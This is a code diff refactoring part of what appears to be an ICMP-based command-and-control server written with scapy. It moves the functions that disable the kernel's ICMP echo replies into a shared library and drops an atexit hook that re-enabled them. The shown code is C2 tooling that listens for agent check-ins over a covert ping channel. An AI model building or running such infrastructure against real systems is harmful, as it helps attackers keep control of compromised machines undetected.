@@ -1,6 +1,4 @@
 import lib.icmp_common as icmp_common
-from subprocess import Popen
-import atexit
 from scapy.all import sniff, send, ICMP, IP
 
 agent_table = {}
@@ -35,16 +33,6 @@ class c2Controller(icmp_common.absurdIcmp):
         send(IP(dst=self.agent_ip) / reply, verbose=False)
 
 
-def reenable_kernel_icmp():
-    Popen("echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all", shell=True)
-    Popen("echo 0 > /proc/sys/net/ipv6/icmp/echo_ignore_all", shell=True)
-
-
-def disable_kernel_icmp():
-    Popen("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all", shell=True)
-    Popen("echo 1 > /proc/sys/net/ipv6/icmp/echo_ignore_all", shell=True)
-
-
 def process_incoming_packets(pkt):
     agent_ip = pkt[IP].src
     sequence = pkt[IP][ICMP].seq
@@ -60,7 +48,6 @@ def process_incoming_packets(pkt):
 
 
 def start():
-    atexit.register(reenable_kernel_icmp)
-    disable_kernel_icmp()
+    icmp_common.disable_kernel_icmp()
     print("awaiting agent check-in")
     sniff(filter="icmp[icmptype] = icmp-echo", prn=process_incoming_packets)
